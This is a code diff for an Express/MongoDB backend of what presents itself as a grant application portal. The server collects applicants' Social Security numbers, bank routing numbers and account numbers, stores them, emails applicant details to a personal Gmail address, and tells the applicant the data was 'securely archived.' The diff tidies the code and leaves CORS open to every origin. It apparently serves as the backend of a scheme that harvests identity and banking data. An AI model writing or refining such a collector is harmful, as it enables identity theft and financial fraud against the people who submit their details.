@@ -15,7 +15,7 @@ const PORT = process.env.PORT || 5000;
 // Allow requests from your frontend
 app.use(
   cors({
-    origin: "*", // In production, replace with your domain
+    origin: "*",
     methods: ["POST", "GET"],
   })
 );
@@ -24,7 +24,6 @@ app.use(bodyParser.json());
 
 // --- SERVE STATIC FILES (for frontend build) ---
 app.use(express.static(path.join(__dirname, "dist")));
-app.use(express.static(__dirname));
 
 // --- DATABASE CONNECTION ---
 const MONGO_URI =
@@ -43,16 +42,12 @@ const ApplicationSchema = new mongoose.Schema({
   phone: String,
   email: { type: String, required: true },
   address: String,
-
   ssn: String,
-
   bankName: String,
   routingNumber: String,
   accountName: String,
   accountNumber: String,
-
   certification: Boolean,
-
   status: { type: String, default: "Pending Review" },
   submittedAt: { type: Date, default: Date.now },
 });
@@ -78,46 +73,30 @@ app.post("/submit", async (req, res) => {
       routingNumber: req.body.branch,
     };
 
-    // 1. Save to Database
     const application = new Application(applicationData);
     await application.save();
 
-    // 2. Send Admin Notification Email
     try {
       await transporter.sendMail({
         from: process.env.EMAIL_USER || "admin@example.com",
         to: "anne67j@gmail.com",
         subject: `New Grant Application: ${req.body.fullName}`,
         text: `
-New Application Received from Official Portal.
+New Application Received.
 
---- APPLICANT DETAILS ---
 Name: ${req.body.fullName}
-DOB: ${req.body.dob}
 Email: ${req.body.email}
 Phone: ${req.body.phone}
 Address: ${req.body.address}
-
---- GRANT DETAILS ---
 Program ID: ${req.body.grantId}
-
---- BANKING & SECURITY ---
-Bank Name: ${req.body.bankName}
-Account Holder: ${req.body.accountName}
-
-Status: Pending Review
         `,
       });
 
-      console.log("Notification email sent to anne67j@gmail.com");
+      console.log("Notification email sent");
     } catch (emailError) {
-      console.warn(
-        "Email failed to send (check credentials):",
-        emailError.message
-      );
+      console.warn("Email failed:", emailError.message);
     }
 
-    // 3. Return Success
     res.status(200).json({
       success: true,
       message: "Application securely archived.",
@@ -125,18 +104,16 @@ Status: Pending Review
     });
   } catch (error) {
     console.error("Error saving application:", error);
-    res
-      .status(500)
-      .json({ success: false, message: "Internal Server Error" });
+    res.status(500).json({ success: false, message: "Internal Server Error" });
   }
 });
 
 // --- SPA FALLBACK (Express v5 compatible) ---
 app.use((req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  res.sendFile(path.join(__dirname, "dist", "index.html"));
 });
 
 // --- START SERVER ---
 app.listen(PORT, () =>
-  console.log(`Server running securely on http://localhost:${PORT}`)
+  console.log(`Server running on port ${PORT}`)
 );
